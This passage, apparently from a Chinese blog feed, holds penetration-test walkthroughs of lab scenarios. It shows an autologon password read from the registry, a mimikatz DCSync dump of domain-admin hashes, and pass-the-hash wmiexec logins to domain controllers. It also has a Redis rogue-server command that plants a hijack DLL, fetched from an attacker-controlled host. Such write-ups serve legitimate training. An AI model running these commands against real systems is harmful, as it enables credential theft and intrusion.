class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\wenshao\Desktop&gt; reg query <span class="string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span></span><br><span class="line">&gt;&gt;</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</span><br><span class="line">    AutoRestartShell    REG_DWORD    <span class="number">0</span>x1</span><br><span class="line">    Background    REG_SZ    <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line">    CachedLogonsCount    REG_SZ    <span class="number">10</span></span><br><span class="line">    DebugServerCommand    REG_SZ    no</span><br><span class="line">    DisableBackButton    REG_DWORD    <span class="number">0</span>x1</span><br><span class="line">    EnableSIHostIntegration    REG_DWORD    <span class="number">0</span>x1</span><br><span class="line">    ForceUnlockLogon    REG_DWORD    <span class="number">0</span>x0</span><br><span class="line">    LegalNoticeCaption    REG_SZ</span><br><span class="line">    LegalNoticeText    REG_SZ</span><br><span class="line">    PasswordExpiryWarning    REG_DWORD    <span class="number">0</span>x5</span><br><span class="line">    PowerdownAfterShutdown    REG_SZ    <span class="number">0</span></span><br><span class="line">    PreCreateKnownFolders    REG_SZ    &#123;A520A1A4<span class="literal">-1780-4FF6-BD18-167343C5AF16</span>&#125;</span><br><span class="line">    ReportBootOk    REG_SZ    <span class="number">1</span></span><br><span class="line">    Shell    REG_SZ    explorer.exe</span><br><span class="line">    ShellCritical    REG_DWORD    <span class="number">0</span>x0</span><br><span class="line">    ShellInfrastructure    REG_SZ    sihost.exe</span><br><span class="line">    SiHostCritical    REG_DWORD    <span class="number">0</span>x0</span><br><span class="line">    SiHostReadyTimeOut    REG_DWORD    <span class="number">0</span>x0</span><br><span class="line">    SiHostRestartCountLimit    REG_DWORD    <span class="number">0</span>x0</span><br><span class="line">    SiHostRestartTimeGap    REG_DWORD    <span class="number">0</span>x0</span><br><span class="line">    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,</span><br><span class="line">    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile</span><br><span class="line">    WinStationsDisabled    REG_SZ    <span class="number">0</span></span><br><span class="line">    ShellAppRuntime    REG_SZ    ShellAppRuntime.exe</span><br><span class="line">    scremoveoption    REG_SZ    <span class="number">0</span></span><br><span class="line">    DisableCAD    REG_DWORD    <span class="number">0</span>x1</span><br><span class="line">    LastLogOffEndTimePerfCounter    REG_QWORD    <span class="number">0</span>xedd7ccd15</span><br><span class="line">    ShutdownFlags    REG_DWORD    <span class="number">0</span>x80000027</span><br><span class="line">    AutoLogonSID    REG_SZ    S<span class="literal">-1-5-21-3623938633-4064111800-2925858365-1180</span></span><br><span class="line">    LastUsedUsername    REG_SZ    yuxuan</span><br><span class="line">    AutoAdminLogon    REG_SZ    <span class="number">1</span></span><br><span class="line">    DefaultUserName    REG_SZ    yuxuan</span><br><span class="line">    DefaultPassword    REG_SZ    Yuxuan7QbrgZ3L</span><br><span class="line">    DefaultDomainName    REG_SZ    xiaorang.lab</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\UserDefaults</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoLogonChecked</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\VolatileUserMgrKey</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DefaultUserName    REG_SZ    yuxuan</span><br><span class="line">DefaultPassword    REG_SZ    Yuxuan7QbrgZ3L</span><br><span class="line">DefaultDomainName    REG_SZ    xiaorang.lab</span><br></pre></td></tr></table></figure><p>重新利用yuxuan登录</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/39.png"></p><h4 id="hassidhistory"><a href="#hassidhistory" class="headerlink" title="hassidhistory"></a>hassidhistory</h4><p>前面还有yuxuan包含了域管的SID，所以我们也有与域管相同的特权与权利</p><blockquote><p>SIDHistory 是 Windows 操作系统中 Active Directory (AD) 用于存储历史安全标识符（SID）的属性。它允许用户、组或计算机对象在变更或迁移时保持旧的 SID，从而保持与先前身份相关的权限和访问控制。这对进行域迁移或升级时非常有用，避免了权限丢失。</p><ol><li>HasSIDHistory</li></ol><p>如果源主体在其 SIDHistory 属性中包含了目标主体的 SID。<br>当为源主体创建 Kerberos 票据时，该票据将包含目标主体的 SID，从而授予源主体与目标主体相同的权限和特权。</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="type">i</span>] SIDHistory Users: <span class="number">1</span> found</span><br><span class="line">                    [+] yuxuan  ==&gt;&gt;&gt;  Administrator </span><br></pre></td></tr></table></figure><p><a href="https://www.c1trus.top/24-%E6%B8%97%E9%80%8F%E5%A7%BF%E5%8A%BF%E5%BA%93/hassidhistory.html#_0">https://www.c1trus.top/24-%E6%B8%97%E9%80%8F%E5%A7%BF%E5%8A%BF%E5%BA%93/hassidhistory.html#_0</a></p><p>那么该用户可以进行DCSync攻击</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Using</span> <span class="string">&#x27;1.txt&#x27;</span> for logfile : OK</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># lsadump::dcsync /domain:xiaorang.lab /user:administrator</span></span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;xiaorang.lab&#x27;</span> will be the domain</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;DC-PROGAME.xiaorang.lab&#x27;</span> will be the DC server</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;administrator&#x27;</span> will be the user account</span><br><span class="line">[<span class="type">rpc</span>] Service  : ldap</span><br><span class="line">[<span class="type">rpc</span>] AuthnSvc : GSS_NEGOTIATE (<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">Object RDN           : Administrator</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : Administrator</span><br><span class="line">Account <span class="built_in">Type</span>         : <span class="number">30000000</span> ( USER_OBJECT )</span><br><span class="line">User Account Control : <span class="number">00000200</span> ( NORMAL_ACCOUNT )</span><br><span class="line">Account expiration   : <span class="number">1601</span>/<span class="number">1</span>/<span class="number">1</span> <span class="number">8</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line">Password last change : <span class="number">2025</span>/<span class="number">5</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">03</span>:<span class="number">13</span></span><br><span class="line">Object Security ID   : S<span class="literal">-1-5-21-3623938633-4064111800-2925858365-500</span></span><br><span class="line">Object Relative ID   : <span class="number">500</span></span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: <span class="number">04</span>d93ffd6f5f6e4490e0de23f240a5e9</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM<span class="literal">-Strong-NTOWF</span> *</span><br><span class="line">    Random Value : a3bff6b37d713aab3129f1ad436a724a</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos<span class="literal">-Newer-Keys</span> *</span><br><span class="line">    Default Salt : XIAORANG.LABAdministrator</span><br><span class="line">    Default Iterations : <span class="number">4096</span></span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : a7c1e1940765d04f18ac3a43d09588e96af827808f921e5855730a2a050ef007</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : <span class="number">3</span>c7453f1f392a7f8c1af77696a160f2d</span><br><span class="line">      des_cbc_md5       (<span class="number">4096</span>) : a8e0b35eefe9d3d0</span><br><span class="line">    OldCredentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : a7c1e1940765d04f18ac3a43d09588e96af827808f921e5855730a2a050ef007</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : <span class="number">3</span>c7453f1f392a7f8c1af77696a160f2d</span><br><span class="line">      des_cbc_md5       (<span class="number">4096</span>) : a8e0b35eefe9d3d0</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : XIAORANG.LABAdministrator</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : a8e0b35eefe9d3d0</span><br><span class="line">    OldCredentials</span><br><span class="line">      des_cbc_md5       : a8e0b35eefe9d3d0</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM<span class="literal">-Strong-NTOWF</span></span><br><span class="line"></span><br><span class="line">* Primary:WDigest *</span><br><span class="line">    <span class="number">01</span>  <span class="number">0</span>f7990fa51442d1fc1b9f5703b7a9f53</span><br><span class="line">    <span class="number">02</span>  f8f3ab7a545c3df42068692e22e5fd1a</span><br><span class="line">    <span class="number">03</span>  <span class="number">63</span>b49f8e791de04010e0d3838864fb5d</span><br><span class="line">    <span class="number">04</span>  <span class="number">0</span>f7990fa51442d1fc1b9f5703b7a9f53</span><br><span class="line">    <span class="number">05</span>  <span class="number">7</span>c94fce5f59a52edc7c941683f529315</span><br><span class="line">    <span class="number">06</span>  db3d41291d2865f07788fcd0878e9048</span><br><span class="line">    <span class="number">07</span>  <span class="number">8</span>cffc17d1ac652e058047f177988f94f</span><br><span class="line">    <span class="number">08</span>  e0204b55258553e92222b39548b6bf64</span><br><span class="line">    <span class="number">09</span>  c024e8558b548d9ed0dac80cb3937227</span><br><span class="line">    <span class="number">10</span>  a55582f6895260bfb4c18eccc5e43639</span><br><span class="line">    <span class="number">11</span>  <span class="number">23</span>cd59de8b7fc224a076a0f3001afbfa</span><br><span class="line">    <span class="number">12</span>  e0204b55258553e92222b39548b6bf64</span><br><span class="line">    <span class="number">13</span>  b4716b4fe3233db5dd79d97fe470a11b</span><br><span class="line">    <span class="number">14</span>  b6b21073a6bd20a1ef665cbdf3633bc9</span><br><span class="line">    <span class="number">15</span>  <span class="number">472854</span>e67b07839a52b40ddeec245582</span><br><span class="line">    <span class="number">16</span>  d47433701f75461a006ab9a73a7ba33b</span><br><span class="line">    <span class="number">17</span>  <span class="number">7655</span>b2aeae13a52426da7558382f1e98</span><br><span class="line">    <span class="number">18</span>  <span class="number">3</span>c384e9401eb1d0467ee29affd959e98</span><br><span class="line">    <span class="number">19</span>  a68e52c5f665ac7f178061a140670af0</span><br><span class="line">    <span class="number">20</span>  <span class="number">51</span>a1204a8e37e806fdfb16f0c2ffd7cb</span><br><span class="line">    <span class="number">21</span>  <span class="number">014900</span>de757e1f20310d8c0d1fb1d812</span><br><span class="line">    <span class="number">22</span>  <span class="number">3</span>f683ca0caafbd5e4dee3b919901066d</span><br><span class="line">    <span class="number">23</span>  b12255387f518480c552971cbab71ac1</span><br><span class="line">    <span class="number">24</span>  <span class="number">6</span>c1b44f40c541a959d45423231dccef4</span><br><span class="line">    <span class="number">25</span>  c18dd5d14b73706c6abc66233f42ada8</span><br><span class="line">    <span class="number">26</span>  <span class="number">11</span>a8ab9dc7e507ee0d99d3295f7c9e06</span><br><span class="line">    <span class="number">27</span>  d5ab194a6f297a6565e230ce525f0539</span><br><span class="line">    <span class="number">28</span>  <span class="number">3</span>b50d0aa5201e3e934bccbe200010ddb</span><br><span class="line">    <span class="number">29</span>  <span class="number">97</span>bafc631fb4dfe596c1a2c5e0ad19e5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># </span></span><br></pre></td></tr></table></figure><p>上传mimikatz读取域管的hash</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/40.png"></p><h4 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python D:\red\内网\免杀工具包\免杀工具包\impacket<span class="literal">-0</span>.<span class="number">12.0</span>\examples\wmiexec.py xiaorang/administrator@<span class="number">172.22</span>.<span class="number">6.25</span>  <span class="literal">-hashes</span> <span class="number">00000000000000000000000000000000</span>:<span class="number">04</span>d93ffd6f5f6e4490e0de23f240a5e9 <span class="literal">-codec</span> gbk</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/41.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/42.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\users\administrator\flag&gt;<span class="built_in">type</span> flag03.txt</span><br><span class="line">flag03: flag&#123;<span class="number">3</span>fc79cff<span class="literal">-8de0-4397-91a4-66c2c283b376</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Maybe you can find something interesting on this server.</span><br><span class="line">=======================================</span><br><span class="line">What you may not know is that many objects <span class="keyword">in</span> this domain</span><br><span class="line">are moved from other domains.</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">172.22</span>.<span class="number">6.12</span>     DC:DC<span class="literal">-PROGAME</span>.xiaorang.lab</span><br><span class="line"><span class="number">172.22</span>.<span class="number">6.25</span>  已拿下   WIN2019.xiaorang.lab</span><br><span class="line"><span class="number">39.98</span>.<span class="number">115.43</span> <span class="number">172.22</span>.<span class="number">6.36</span>  已拿下   neo4j 未授权rce</span><br><span class="line"><span class="number">172.22</span>.<span class="number">6.38</span>  已利用 web网站标题 http://<span class="number">172.22</span>.<span class="number">6.38</span>        状态码:<span class="number">200</span> 长度:<span class="number">1531</span>   标题:后台登录</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python D:\red\内网\免杀工具包\免杀工具包\impacket<span class="literal">-0</span>.<span class="number">12.0</span>\examples\wmiexec.py xiaorang/administrator@<span class="number">172.22</span>.<span class="number">6.12</span>  <span class="literal">-hashes</span> <span class="number">00000000000000000000000000000000</span>:<span class="number">04</span>d93ffd6f5f6e4490e0de23f240a5e9 <span class="literal">-codec</span> gbk</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/43.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\users\administrator\flag&gt;<span class="built_in">type</span> flag04.txt</span><br><span class="line">Awesome! you got the final flag.</span><br><span class="line"></span><br><span class="line">::::::::::::::::::::::::::    :::: ::::::::::</span><br><span class="line">    :+:        :+:    +:+:+: :+:+:+:+:</span><br><span class="line">    +:+        +:+    +:+ +:+:+ +:++:+</span><br><span class="line">    +<span class="comment">#+        +#+    +#+  +:+  +#++#++:++#</span></span><br><span class="line">    +<span class="comment">#+        +#+    +#+       +#++#+</span></span><br><span class="line">    <span class="comment">#+#        #+#    #+#       #+##+#</span></span><br><span class="line">    <span class="comment">###    ##############       #############</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag04: flag&#123;<span class="number">48</span>aa6b81<span class="literal">-da4c-4f53-b90a-95e3460eaf84</span>&#125;</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">172.22</span>.<span class="number">6.12</span>  已拿下   DC:DC<span class="literal">-PROGAME</span>.xiaorang.lab</span><br><span class="line"><span class="number">172.22</span>.<span class="number">6.25</span>  已拿下   WIN2019.xiaorang.lab</span><br><span class="line"><span class="number">39.98</span>.<span class="number">115.43</span> <span class="number">172.22</span>.<span class="number">6.36</span>  已拿下   neo4j 未授权rce</span><br><span class="line"><span class="number">172.22</span>.<span class="number">6.38</span>  已利用 web网站标题 http://<span class="number">172.22</span>.<span class="number">6.38</span>        状态码:<span class="number">200</span> 长度:<span class="number">1531</span>   标题:后台登录</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/44.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶机渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云镜-MagicRelay</title>
      <link href="/post/633b4305.html"/>
      <url>/post/633b4305.html</url>
      
        <content type="html"><![CDATA[<p>参考wp：<a href="https://www.c1trus.top/37-%E9%9D%B6%E6%9C%BAwp/1-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/%E4%BB%BF%E7%9C%9F%E5%9C%BA%E6%99%AF/magicrelay.html">https://www.c1trus.top/37-%E9%9D%B6%E6%9C%BAwp/1-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/%E4%BB%BF%E7%9C%9F%E5%9C%BA%E6%99%AF/magicrelay.html</a></p><p>还是开局一个ip</p><p>39.99.248.17</p><p>先fscan扫</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">D:\red\内网\免杀工具包\免杀工具包\fscan火绒6.0免杀版\fscan2.0&gt;fscan.exe -h 39.99.248.17</span><br><span class="line"></span><br><span class="line">   ___                              _</span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __</span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\</span><br><span class="line">                     fscan version: 2.0.0</span><br><span class="line">[*] 扫描类型: all, 目标端口: 21,22,80,81,135,139,443,445,1433,1521,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017,80,81,82,83,84,85,86,87,88,89,90,91,92,98,99,443,800,801,808,880,888,889,1000,1010,1080,1081,1082,1099,1118,1888,2008,2020,2100,2375,2379,3000,3008,3128,3505,5555,6080,6648,6868,7000,7001,7002,7003,7004,7005,7007,7008,7070,7071,7074,7078,7080,7088,7200,7680,7687,7688,7777,7890,8000,8001,8002,8003,8004,8006,8008,8009,8010,8011,8012,8016,8018,8020,8028,8030,8038,8042,8044,8046,8048,8053,8060,8069,8070,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,8096,8097,8098,8099,8100,8101,8108,8118,8161,8172,8180,8181,8200,8222,8244,8258,8280,8288,8300,8360,8443,8448,8484,8800,8834,8838,8848,8858,8868,8879,8880,8881,8888,8899,8983,8989,9000,9001,9002,9008,9010,9043,9060,9080,9081,9082,9083,9084,9085,9086,9087,9088,9089,9090,9091,9092,9093,9094,9095,9096,9097,9098,9099,9100,9200,9443,9448,9800,9981,9986,9988,9998,9999,10000,10001,10002,10004,10008,10010,10250,12018,12443,14000,16080,18000,18001,18002,18004,18008,18080,18082,18088,18090,18098,19001,20000,20720,21000,21501,21502,28018,20880</span><br><span class="line">[*] 开始信息扫描...</span><br><span class="line">[*] 最终有效主机数量: 1</span><br><span class="line">[*] 共解析 218 个有效端口</span><br><span class="line">[+] 端口开放 39.99.248.17:139</span><br><span class="line">[+] 端口开放 39.99.248.17:6379</span><br><span class="line">[+] 端口开放 39.99.248.17:135</span><br><span class="line">[+] 存活端口数量: 3</span><br><span class="line">[*] 开始漏洞扫描...</span><br><span class="line">[+] Redis扫描模块开始...</span><br><span class="line">[*] NetInfo</span><br><span class="line">[*] 39.99.248.17</span><br><span class="line">   [-&gt;] WIN-YUYAOX9Q</span><br><span class="line">   [-&gt;] 172.22.12.25</span><br><span class="line">[+] Redis 39.99.248.17:6379 发现未授权访问 文件位置:C:\Program Files\Redis/dump.rdb</span><br><span class="line">[!] 扫描错误 39.99.248.17:139 - netbios error</span><br><span class="line">[+] 扫描已完成: 3/3</span><br><span class="line">[*] 扫描结束,耗时: 10.0939223s</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-MagicRelay/1.png"></p><h2 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h2><p>redis未授权</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-MagicRelay/2.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-MagicRelay/3.png"></p><h3 id="dll劫持"><a href="#dll劫持" class="headerlink" title="dll劫持"></a>dll劫持</h3><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-MagicRelay/4.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python DLLHijacker.py dbghelp.dll</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-MagicRelay/5.png"></p><p><a href="https://xz.aliyun.com/news/13892">https://xz.aliyun.com/news/13892</a></p><p>2022的解决方法</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-MagicRelay/6.png"><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-MagicRelay/7.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-MagicRelay/8.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-MagicRelay/9.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-MagicRelay/10.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-MagicRelay/11.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-MagicRelay/12.png"></p><p>上传到服务器</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-MagicRelay/13.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 RedisWriteFile.py --rhost 39.99.248.17 --rport 6379 --lhost 47.113.229.136  --lport 16379 --rpath &#x27;C:\\Program Files\\Redis\\&#x27; --rfile &#x27;dbghelp.dll&#x27; --lfile &#x27;dbghelp.dll&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">root@iZf8z44eks6m9aisejfxi7Z:/home/red/redis/RedisWriteFile-master# python3 RedisWriteFile.py --rhost 39.99.248.17 --rport 6379 --lhost 47.113.229.136  --lport 16379 --rpath &#x27;C:\\Program Files\\Redis\\&#x27; --rfile &#x27;dbghelp.dll&#x27; --lfile &#x27;dbghelp.dll&#x27;</span><br><span class="line"></span><br><span class="line">______         _ _     _    _      _ _      ______ _ _      </span><br><span class="line">| ___ \       | (_)   | |  | |    (_) |     |  ___(_) |     </span><br><span class="line">| |_/ /___  __| |_ ___| |  | |_ __ _| |_ ___| |_   _| | ___ </span><br><span class="line">|    // _ \/ _` | / __| |/\| | &#x27;__| | __/ _ \  _| | | |/ _ \</span><br><span class="line">| |\ \  __/ (_| | \__ \  /\  / |  | | ||  __/ |   | | |  __/</span><br><span class="line">\_| \_\___|\__,_|_|___/\/  \/|_|  |_|\__\___\_|   |_|_|\___|     </span><br><span class="line"></span><br><span class="line">                    Author : R3start   </span><br><span class="line">          Reference : redis-rogue-server.py</span><br><span class="line"></span><br><span class="line">[info] TARGET 39.99.248.17:6379</span><br><span class="line">[info] SERVER 47.113.229.136:16379</span><br><span class="line">[info] 连接恶意主服务器: 47.113.229.136:16379 </span><br><span class="line">[info] 连接恶意主状态: +OK</span><br><span class="line"> </span><br><span class="line">[info] 设置写出路径为: C:\\Program Files\\Redis\\ </span><br><span class="line">[info] 设置写出路径状态: +OK</span><br><span class="line"> </span><br><span class="line">[info] 设置写出文件为: dbghelp.dll</span><br><span class="line">[info] 设置写出文件状态: +OK</span><br><span class="line"> </span><br><span class="line">[info] 断开主从连接: +OK</span><br><span class="line"></span><br><span class="line">[info] 恢复原始文件名: +OK</span><br><span class="line"></span><br><span class="line">root@iZf8z44eks6m9aisejfxi7Z:/home/red/redis/RedisWriteFile-master# redis-cli -h 39.99.248.17</span><br><span class="line">39.99.248.17:6379&gt; bgsave</span><br><span class="line">Background saving started</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>或使用rabr</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 